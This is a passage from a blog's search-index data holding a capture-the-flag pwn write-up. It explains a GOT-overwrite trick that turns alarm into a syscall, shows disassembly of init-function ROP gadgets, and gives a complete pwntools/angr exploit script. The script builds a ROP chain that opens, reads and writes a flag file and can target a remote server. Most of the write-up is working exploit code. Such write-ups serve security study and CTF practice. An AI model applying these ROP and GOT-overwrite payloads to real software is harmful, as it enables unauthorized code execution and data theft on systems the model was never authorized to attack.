; and byte ptr [rax], al ; add ebx, esi ; ret</span><br></pre></td></tr></table></figure>\n<p>We could use the magic gadget. First we set the rdi to buf and call gets to push ‘\\x05’ on it, and then we set the rdi to got[‘alarm’] and call the gadget, we could change the lowest byte to ‘\\x05’. Finally we get a syscall at got[‘alarm’].</p>\n<p>If we get a syscall, we could ROP as usual using some gadget (#1 &amp; #2) in init funciton of x86_64.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400D90 loc_400D90:                             ; CODE XREF: init+54↓j</span><br><span class=\"line\">.text:0000000000400D90                 mov     rdx, r13\t#1</span><br><span class=\"line\">.text:0000000000400D93                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400D96                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400D99                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:0000000000400D9D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400DA1                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400DA4                 jnz     short loc_400D90</span><br><span class=\"line\">.text:0000000000400DA6</span><br><span class=\"line\">.text:0000000000400DA6 loc_400DA6:                             ; CODE XREF: init+34↑j</span><br><span class=\"line\">.text:0000000000400DA6                 add     rsp, 8</span><br><span class=\"line\">.text:0000000000400DAA                 pop     rbx\t\t#2</span><br><span class=\"line\">.text:0000000000400DAB                 pop     rbp</span><br><span class=\"line\">.text:0000000000400DAC                 pop     r12</span><br><span class=\"line\">.text:0000000000400DAE                 pop     r13</span><br><span class=\"line\">.text:0000000000400DB0                 pop     r14</span><br><span class=\"line\">.text:0000000000400DB2                 pop     r15</span><br><span class=\"line\">.text:0000000000400DB4                 retn</span><br></pre></td></tr></table></figure>\n<p>Since rax control the syscall, we could use atoi function to set rax to any value we want.</p>\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><p>Since the binary varies each time, We also need to get these gadgets and the size of stack overflow automatically, using <a href=\"http://pwntools.readthedocs.io/en/stable/\" target=\"_blank\" rel=\"noopener\">pwntools</a>.</p>\n<p>Process: use angr to get num -&gt; set alarm to syscall -&gt; open -&gt; read -&gt; write</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> pwnlib, time</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> angr,claripy</span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"keyword\">None</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ru</span><span class=\"params\">(delim)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.recvuntil(delim, timeout=<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rn</span><span class=\"params\">(count)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.recvn(count)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sl</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.sendline(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sn</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.send(data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_num</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    p = angr.Project(<span class=\"string\">'./xx_game'</span>,auto_load_libs=<span class=\"keyword\">False</span>)</span><br><span class=\"line\">    st = p.factory.blank_state(addr=<span class=\"number\">0x400BC5</span>)</span><br><span class=\"line\">    st.regs.rbp = <span class=\"number\">0xffffffd800000</span></span><br><span class=\"line\">    st.regs.rsp = <span class=\"number\">0xffffffe800000</span></span><br><span class=\"line\">    num = claripy.BVS(<span class=\"string\">'num'</span>,<span class=\"number\">4</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">    st.memory.store(st.regs.rbp<span class=\"number\">-0x100</span>,num)</span><br><span class=\"line\">    st.regs.rdi = num</span><br><span class=\"line\">    sm = p.factory.simgr(st)</span><br><span class=\"line\">    sm.explore()</span><br><span class=\"line\">    res = sm.deadended[<span class=\"number\">0</span>].se.eval(num, cast_to=int)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> s</span><br><span class=\"line\">    context(os=<span class=\"string\">'linux'</span>,arch=<span class=\"string\">'amd64'</span>)</span><br><span class=\"line\">    debug = <span class=\"number\">1</span></span><br><span class=\"line\">    logg = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        s = process([<span class=\"string\">'./xx_game'</span>,<span class=\"string\">'14111192'</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        s = remote(<span class=\"string\">'117.50.14.29'</span>, <span class=\"number\">2333</span>)</span><br><span class=\"line\">        ru(<span class=\"string\">'data info------------------\\n'</span>)</span><br><span class=\"line\">        b64 = ru(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>]</span><br><span class=\"line\">        os.system(<span class=\"string\">'echo %s | base64 -d &gt; xx_game'</span>%b64)</span><br><span class=\"line\">        num = get_num()</span><br><span class=\"line\">        log.success(<span class=\"string\">\"num is %s\"</span>%str(num))</span><br><span class=\"line\">        ru(<span class=\"string\">'game:'</span>)</span><br><span class=\"line\">        sl(str(num))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> logg:</span><br><span class=\"line\">        context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    elf = ELF(<span class=\"string\">'./xx_game'</span>)</span><br><span class=\"line\">    rop = ROP(elf)</span><br><span class=\"line\">    pad = u16(elf.read(<span class=\"number\">0x400BCC</span>,<span class=\"number\">2</span>)) - <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">    init = u32(elf.read(elf.entry + <span class=\"number\">0x19</span>, <span class=\"number\">0x4</span>))</span><br><span class=\"line\">    pop_six = init+<span class=\"number\">0x5a</span></span><br><span class=\"line\">    to_call = init+<span class=\"number\">0x40</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    pop_rdi_ret = rop.search(regs=[<span class=\"string\">'rdi'</span>], order = <span class=\"string\">'regs'</span>).address</span><br><span class=\"line\">    pop_rsi_r15_ret = rop.search(regs=[<span class=\"string\">'rsi'</span>,<span class=\"string\">'r15'</span>], order = <span class=\"string\">'regs'</span>).address</span><br><span class=\"line\">    xchg = <span class=\"number\">0x4008f5</span> <span class=\"comment\">#xchg byte ptr [rdi], dl ; and byte ptr [rax], al ; add ebx, esi ; ret</span></span><br><span class=\"line\">    buf = <span class=\"number\">0x602100</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    log.success(<span class=\"string\">\"padding = %s\"</span>%hex(pad))</span><br><span class=\"line\">    log.success(<span class=\"string\">\"pop_rdi_ret = %s\"</span>%hex(pop_rdi_ret))</span><br><span class=\"line\">    log.success(<span class=\"string\">\"pop_rsi_ret = %s\"</span>%hex(pop_rsi_r15_ret))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(s,\"b *0x400CF4\")</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">'A'</span>*pad</span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x30</span>)</span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">'gets'</span>])  <span class=\"comment\"># gets will set rax -&gt; buf</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x30</span>)</span><br><span class=\"line\">    payload += p64(xchg)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(elf.got[<span class=\"string\">'alarm'</span>]) </span><br><span class=\"line\">    payload += p64(xchg)            <span class=\"comment\">#set alarm to syscall</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x40</span>)</span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">'atoi'</span>]) <span class=\"comment\">#set rax-&gt; 2 open</span></span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x38</span>) <span class=\"comment\">#\"./flag\"</span></span><br><span class=\"line\">    payload += p64(pop_rsi_r15_ret)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">'alarm'</span>]) <span class=\"comment\">#open</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">'atoi'</span>]) <span class=\"comment\">#set rax-&gt; 0 read</span></span><br><span class=\"line\">    payload += p64(pop_six)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += p64(elf.got[<span class=\"string\">'alarm'</span>]) <span class=\"comment\">#read</span></span><br><span class=\"line\">    payload += p64(<span class=\"number\">0x30</span>)</span><br><span class=\"line\">    payload += p64(buf)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">    payload += p64(to_call)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0xdeadbeef</span>)*<span class=\"number\">7</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload += p64(pop_rdi_ret)</span><br><span class=\"line\">    payload += p64(buf+<span class=\"number\">0x50</span>)</span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">'atoi'</span>]) <span class=\"comment\">#set rax-&gt; 1 write</span></span><br><span class=\"line\">    payload += p64(pop_six)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += p64(elf.got[<span class=\"string\">'alarm'</span>]) <span class=\"comment\">#write</span></span><br><span class=\"line\">    payload += p64(<span class=\"number\">0x30</span>)</span><br><span class=\"line\">    payload += p64(buf)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += p64(to_call)</span><br><span class=\"line\">    payload += p64(<span class=\"number\">0xdeadbeef</span>)*<span class=\"number\">7</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"string\">'\\n'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#raw_input()</span></span><br><span class=\"line\">    s.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload2 = p64(<span class=\"number\">5</span>)</span><br><span class=\"line\">    payload2 += <span class=\"string\">\"./flag\"</span>+<span class=\"string\">'\\x00'</span>*<span class=\"number\">2</span></span><br><span class=\"line\">    payload2 += <span class=\"string\">'2'</span>+<span class=\"string\">'\\x00'</span>*<span class=\"number\">7</span></span><br><span class=\"line\">    payload2 += <span class=\"string\">'0'</span>+<span class=\"string\">'\\x00'</span>*<span class=\"number\">7</span></span><br><span class=\"line\">    payload2 += <span class=\"string\">'1'</span>+<span class=\"string\">'\\x00'</span>*<span class=\"number\">7</span></span><br><span class=\"line\">    <span class=\"comment\">#raw_input()</span></span><br><span class=\"line\">    s.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.interactive()</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n","categories":["Pwn"],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]}]